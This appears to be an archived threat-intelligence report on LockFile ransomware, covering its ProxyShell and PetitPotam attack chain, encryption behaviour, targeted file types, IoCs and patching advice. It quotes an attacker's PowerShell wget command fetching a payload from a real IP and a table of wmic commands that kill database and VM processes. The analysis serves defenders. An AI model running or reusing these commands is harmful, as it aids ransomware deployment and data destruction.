{
    "id": "15095b2f-81c1-4d67-a9c0-af3128efa7d9",
    "created_at": "2023-01-12T15:00:11.078577Z",
    "updated_at": "2025-03-27T02:05:33.311598Z",
    "deleted_at": null,
    "sha1_hash": "ffb7cbb371eaf8f6504f5925bdb3772d63320bed",
    "title": "2021-08-25 - ​LockFile Ransomware- Exploiting Microsoft Exchange Vulnerabilities Using ProxyShell",
    "authors": "",
    "file_creation_date": "2022-05-27T23:08:11Z",
    "file_modification_date": "2022-05-27T23:08:11Z",
    "file_size": 1689868,
    "plain_text": "# LockFile Ransomware: Exploiting Microsoft Exchange Vulnerabilities Using ProxyShell\n\n**[blog.cyble.com/2021/08/25/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/](https://blog.cyble.com/2021/08/25/lockfile-ransomware-using-proxyshell-attack-to-deploy-ransomware/)**\n\nAugust 25, 2021\n\nThe LockFile ransomware was first seen in July 2021 and has been highly active since then. It has global\noperations, and most of the victims are from the United States of America and Asia. The ransomware group hosts a\nwebsite in the TOR network to guide victims to pay the ransom and subsequently get the instructions to decrypt the\nfiles. This webpage contains a uTox ID and an email address to contact the Threat Actor (TA), as shown in the\nfigure below.\n\n_Figure 1: LockFile Ransomware Website_\nCyble Researchers found that a few details indicate that the ransomware gang could also be related to the other\nthreat actors from the ransomware website. For example, as mentioned in the ATTENTION section of the website, the\nlast line mentions a wallpaper being provided by lockbit, and the contact email contains a reference to Conti.\n\nRecently the Threat Actor (TA) behind LockFile has started attacking Microsoft Exchange Servers\nusing ProxyShell attack. The ProxyShell attack uses chained Microsoft Exchange vulnerabilities mentioned in the list\nbelow, resulting in unauthenticated code execution. Orange Tsai, a Principal Security\nResearcher from Devcore, recently discovered these vulnerabilities. Following is the list of vulnerabilities.\n\n[CVE-2021-34473 - Pre-auth Path Confusion leads to ACL Bypass (Patched in April by](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) [KB5001779)](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-2016-and-2013-april-13-2021-kb5001779-8e08f3b3-fc7b-466c-bbb7-5d5aa16ef064)\n[CVE-2021-34523 - Elevation of Privilege on Exchange PowerShell Backend (Patched in April by](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) [KB5001779)](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-2016-and-2013-april-13-2021-kb5001779-8e08f3b3-fc7b-466c-bbb7-5d5aa16ef064)\n[CVE-2021-31207 - Post-auth Arbitrary-File-Write leads to RCE (Patched in May by](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31207) [KB5003435)](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-2016-and-2013-may-11-2021-kb5003435-028bd051-b2f1-4310-8f35-c41c9ce5a2f1)\n\nAccording to a [Symantec blog post, after successful exploitation, the TA uses the PowerShell command.](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockfile-ransomware-new-petitpotam-windows)\n\n**_powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH_**\n\n\n-----\n\nThe PowerShell command in use is unknown, but on August 13, 2021, an independent security researcher captured\nthe associated IP address (209.14.0[.]234). According to the researcher, attackers used this IP to exploit _ProxyShell_\n_Vulnerability._\n\nResearchers also found that 20 to 30 minutes before the deployment of ransomware, the TA drops three files:\n\nAn Exploit for PetitPotam vulnerability [(CVE-2021-36942), namely efspotato.exe.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)\n\nTwo files: active_desktop_render.dll and active_desktop_launcher.exe\n\n_PetitPotam vulnerability allows the TA to compromise Domain Controller, which results in the compromise_\nof the complete Active Directory. The PetitPotam technique uses MS-EFSRPC (Microsoft’s Encrypting File System\nRemote Protocol), Which is responsible for performing maintenance and management operations on the encrypted\ndata stored on the remote system.\n\nAs per Symantec, the executable active_desktop_launcher.exe is legitimate\nsoftware, but active_desktop_render.dll is a malicious Dynamic Link Library (DLL). The active_desktop_render.dll is\nloaded using the DLL Search Order Hijacking attack. After loading, the DLL file drops and\ndecrypts desktop.ini in a local directory. This desktop.ini then loads and executes shellcode, which then\nactivates the efspotato.exe file that is exploited for the PetitPotam vulnerability.\n\nUpon compromising the domain, the TA then deploys LockFile ransomware in various systems of the\ncompromised domain.\n\nCyble Research found one of the LockFile malware samples from the surface web while conducting routine OpenSource Intelligence (OSINT) threat hunting exercises. The figure below shows the high-level\nexecution flow of LockFile Ransomware. The malware initially kills all the known processes related to virtual\nmachines, databases, and other related services. Then, it iterates through drives into the system to find the logical\ndrive to search for files and folders. After the files are found, the malware checks the extensions of the file, and if\nmatched to the pre-defined file extension, the ransomware encrypts it. After completing the encryption process, it\ndeletes itself.\n\n_Figure 2 High-level execution flow of LockFile Ransomware_\n\n## Technical Analysis\n\nOur static analysis found that the malware is a Windows-based x64 architecture Console application written in C/C++\nand compiled on 2021-07-03 18:15:34, as shown in the figure below.\n\n\n-----\n\n_Figure 3:_\n\n_Static details of LockFile Ransomware_\nAs shown in the figure below, the malware creates several subprocesses to perform several activities upon\nexecution.\n\n_Figure 4: Process Tree created by LockFile Ransomware_\nThe subprocess kills various running processes shown in Table 1. The malware uses the Windows Management\nInterface Command (WMIC) command and provides the process name as a wild card in between %% to achieve this\ntask. WMIC is a simple command prompt tool that returns information about the system you are running it on.\n\nThe list of commands which the malware has executed is shown in table below.\n\n**Command** **Target**\n**Process**\n\n\n-----\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%vmwp%'” call terminate vmwp\n\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%virtualbox%'” call\nterminate\n\n\nvirtualbox\n\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%vbox%'” call terminate vbox\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%sqlservr%'” call terminate sqlservr\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%mysqld%'” call terminate mysqld\n\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%omtsreco%'” call\nterminate\n\n\nomtsreco\n\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%oracle%'” call terminate oracle\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%tnslsnr%'” call terminate tnslsnr\n\nC:\\Windows\\system32\\cmd.exe /c wmic process where “name like ‘%vmware%'” call terminate vmware\n\n_Table 1 WMIC Commands executed by Ransomware to Kill Processes_\nOnce the ransomware kills all the processes, it iterates through the victim’s machine and encrypts the user document\nfiles and appends extensions with .lockfile, as shown in the figure below.\n\n_Figure 5: Files encrypted by LockFile_\nOnce the files are encrypted, the malware launches an HTML Application file (HTA) to show the ransom message to\nthe user, as shown in the figure below, and then deletes itself.\n\n\n-----\n\n_Figure 6: Ransom Message Created by LockFile_\n\n## Code Analysis and Debugging\n\nThe figure below shows that the malware calls a series of WMIC commands to kill various processes upon\ndebugging. The list of commands is shown in Table 1.\n\n_Figure 7: WMIC commands used by LockFile ransomware to kill processes_\nOnce the ransomware kills all the defined processes, it extracts the ransom note content from the executable, as\nshown below.\n\n\n-----\n\n_Figure 8: Ransom Note Extracted from LockFile Ransomware in Memory_\nAfterward, the malware gets the list of drives using the GetLogicalDriveStringsA Application Programming Interface\n(API). Finally, the list of drives is passed one at a time to GetDriveTypeA API, after which the result compares with 03\n(DRIVE_FIXED), which indicates whether the found drive is fixed media, e.g., Logical Drives as shown below. Once\nthe drive is located, the malware creates a thread to conduct further ransomware activity.\n\n_Figure 9:_\n\n_Fixed Media checked by LockFile_\nThe malware thread creates LOCKFILE-README.hta in the root, as shown in the figure below.\n\n_Figure 10: LockFile’s Thread creating LOCKFILE-README.hta in C:/_\nThen the ransomware starts iterating through the files and folder. The code passes whatever files/folders are found\nthrough a series of checks. The checks are mentioned below list.\n\n1 – desktop.ini string is not present in the filename\n\n2 – _[\\\\Windows is not present in the full path](https://windows/)_\n\n3 – LOCKFILE string is not present in the filename\n\n4 – NTUSER string is not present in the filename\n\nThe checks are shown in the below code.\n\n\n-----\n\n_Figure 11: Checks performed_\n\n_by LockFile._\nOnce all the checks are passed, the malware compares the files extension with a pre-defined extension embedded in\nthe malware. The code is shown in the figure below.\n\n_Figure 12: File Extension Compared by LockFile_\n\nFor example, in the below figure, we can see that the malware is comparing 36897c.rbf extension\nwith .1cd extension.\n\n_Figure 13 Ransomware Check File Extension_\nSimilarly, the malware compares all extensions, shown in Table 2, with the victim’s file. This activity helps\nus conclude that the malware is targeting only a specific extension file.\n\n.lcd\n.7z\n\n.7zip\n\n.acccdb\n\n.ai\n.asp\n\n.aspx\n\n.backup\n\n.bak\n\n.cd\n\n.cdr\n\n.cdx\n\n.cer\n\n.cf\n\n.cfl\n\n.cfu\n\n.config\n\n.cs\n\n.csv\n\n.dat\n\n.db\n\n.dbf\n\n.doc\n\n.docx\n\ndt\n\n\n-----\n\n.dwg\n.edb\n.efd\n.elf\n.epf\n.erf\n.fpt\n.geo\n.grs\n.html\n.ibd\n.jpeg\n.ldf\n.lgf\n.lgp\n.log\n.mdb\n.mdf\n.mft\n.mp3\n.mxl\n.myd\n.odt\n.pdf\n.pff\n.php\n.ppt\n.pptx\n.ps1\n.psd\n.pst\n.rar\n.sln\n.sql\n.sqlite\n.st\n.tiff\n.txt\n.vdi\n.vhd\n.vhdx\n.vmdk\n.vrp\n.wdb\n.xls\n.xlsx\n.zip\n\n_Table 2 List of File Extensions which are targeted by ransomware_\nAs shown below in figure 14, once the file is found with the defined extension, the malware reads the plain text\ncontent from the file.\n\n\n-----\n\n_Figure 14 Read Plain Text_\n\n_content from Victim’s File_\nIt then calls another user-defined function for encrypting the content using Advanced Encryption Standard (AES), as\nshown below.\n\n_Figure 15 Call Encryption_\n\n_Function to encrypt the content_\nOnce the content is encrypted, the malware writes it into the file, and then it appends the encrypted file with\nextension .lockfile using MoveFileA API, as shown in the below figure.\n\n_Figure 16 Append .lockfile extension to the user document_\n\n_file_\nThe same activity is shown below in figure 17.\n\n_Figure 17 Append .lockfile extension to the user document file while debugging_\n\n\n-----\n\nOnce all the files have been encrypted, the malware creates a ransom note .hta\nfile in the C:\\Users\\Public directory, as shown in the figure below.\n\n_Figure 18 Creates .HTA ransom file C:\\Users\\Public_\nOnce the .hta ransom file is created, it calls CreateProcess API to launch the .hta file using mshta.exe windows\nutility. The mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.\n\n_Figure 19 Launch.HTA ransom File using mshta.exe_\nFinally, once all the files are encrypted, the malware deletes itself by calling the del command, as shown below.\n\n_Figure 20 Use Del command to delete itself_\n\n## Conclusion \n\nThe threat actors behind the LockFile exploit publicly disclosed vulnerabilities in sequence to attack Microsoft\nExchange Server and then use PetitPotam vulnerability to compromise the Domain Controller. After achieving these\ntwo objectives, the TA drops the LockFile ransomware into the systems.\n\nBased on the ransom notes, we speculate that the TA may be creating unique custom variants of\nthe LockFile ransomware for each victim organization.\n\nCyble Research Labs continuously monitors the LockFile ransomware activity; we will continue to update our readers\nwith our latest findings.\n\n## Our Recommendations\n\nWe have listed some essential cybersecurity best practices that create the first line of control against attackers. We\nrecommend that our readers follow the suggestions given below:\n\nPatch the [CVE-2021-34473,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) [CVE-2021-34523, and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) [CVE-2021-31207 as soon as possible if not](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31207)\npatched already.\nFollow [KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS) guide to](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)\nmitigating PetitPotam impact.\nRegularly perform a vulnerability assessment of the organizational assets, majorly which are exposed\non the internet.\n\nUse a reputed anti-virus and internet security software package on your connected devices.\nConduct regular backup practices and keep those backups offline or in a separate network.\nRefrain from opening untrusted links and email attachments without verifying their authenticity.\nTurn on the automatic software update feature on your computer, mobile, and other connected devices\nwherever possible and pragmatic.\nUse strong passwords and enforce multi-factor authentication wherever possible.\n\n## MITRE ATT&CK® Techniques\n\n\n-----\n\n**Tactic** **Technique ID** **Technique Name**\n\n**Reconnaissance** [T1595.002](https://attack.mitre.org/techniques/T1595/002/) [T1591](https://attack.mitre.org/techniques/T1591/) [T1593](https://attack.mitre.org/techniques/T1593/) Active Scanning Gather Victim Org Information Search Open\nWebsites/Domains\n\n**Initial Access** [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application\n\n**Execution** [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell\n\n**Defense Evasion** [T1574.001](https://attack.mitre.org/techniques/T1574/001/) Hijack Execution Flow: DLL Search Order Hijacking\n\n\n**Lateral**\n**Movement**\n\n\n[T1210](https://attack.mitre.org/techniques/T1210/) Exploitation of Remote Services\n\n\n**Impact** [T1486](https://attack.mitre.org/techniques/T1486/) Data Encrypted for Impact\n\n## Indicators of Compromise (IoCs): \n\n**Indicators** **Indicator**\n**type**\n\n\n**Description**\n\n\n354a362811b8917bd7245cdd43fe12de9ca3f5f6afe5a2ec97eec81c400a4101 SHA256 LockFile Ransomware\n\ned834722111782b2931e36cfa51b38852c813e3d7a4d16717f59c1d037b62291 SHA256 Malicious DLL\n\n36e8bb8719a619b78862907fd49445750371f40945fefd55a9862465dc2930f9 SHA256 Driver file\n\n5a08ecb2fad5d5c701b4ec42bd0fab7b7b4616673b2d8fbd76557203c5340a0f SHA256 Malicious executable\n\n1091643890918175dc751538043ea0743618ec7a5a9801878554970036524b75 SHA256 Malicious DLL\n\n7bcb25854ea2e5f0b8cfca7066a13bc8af8e7bac6693dea1cdad5ef193b052fd SHA256 PetitPotam exploit\n\nbf315c9c064b887ee3276e1342d43637d8c0e067260946db45942f39b970d7ce SHA256 LockFile executable\n\n\n209.14.0[.]234 IP\naddress\n\n## About Us \n\n\nAttacher’s IP\n\n\n[Cyble is a global threat intelligence SaaS provider that helps enterprises protect themselves from cybercrimes and](https://cyble.com/)\nexposure in the Darkweb. Its prime focus is to provide organizations with real-time visibility to their digital risk\nfootprint. Backed by Y Combinator as part of the 2021 winter cohort, Cyble has also been recognized by Forbes as\none of the top 20 Best Cybersecurity Start-ups To Watch In 2020. Headquartered in Alpharetta, Georgia, and with\noffices in Australia, Singapore, and India, Cyble has a global presence. To learn more about Cyble,\nvisit www.cyble.com.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-25 - ​LockFile Ransomware- Exploiting Microsoft Exchange Vulnerabilities Using ProxyShell.pdf"
    ],
    "report_names": [
        "2021-08-25 - ​LockFile Ransomware- Exploiting Microsoft Exchange Vulnerabilities Using ProxyShell.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535611,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1653692891,
    "ts_modification_date": 1653692891,
    "files": {
        "pdf": "https://archive.orkl.eu/ffb7cbb371eaf8f6504f5925bdb3772d63320bed.pdf",
        "text": "https://archive.orkl.eu/ffb7cbb371eaf8f6504f5925bdb3772d63320bed.txt",
        "img": "https://archive.orkl.eu/ffb7cbb371eaf8f6504f5925bdb3772d63320bed.jpg"
    }
}